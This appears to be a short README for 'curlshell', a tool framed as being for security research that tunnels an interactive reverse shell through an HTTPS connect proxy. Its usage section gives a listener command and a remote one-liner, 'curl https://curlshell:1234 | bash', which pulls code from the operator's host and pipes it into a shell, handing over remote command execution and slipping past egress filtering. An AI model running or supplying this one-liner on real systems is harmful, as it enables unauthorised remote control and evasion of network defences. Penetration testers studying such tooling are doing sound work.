# Reverse shell using curl

During security research, you may end up running code in an environment,
where establishing raw TCP connections to the outside world is not possible;
outgoing connection may only go through a connect proxy (HTTPS_PROXY).
This simple interactive HTTP server provides a way to mux 
stdin/stdout and stderr of a remote reverse shell over that proxy with the
help of curl.

## Usage

Start your listener:

```
./curlshell.py --certificate fullchain.pem --private-key privkey.pem --listen-port 1234
```

On the remote side:

```
curl https://curlshell:1234 | bash
```

That's it!
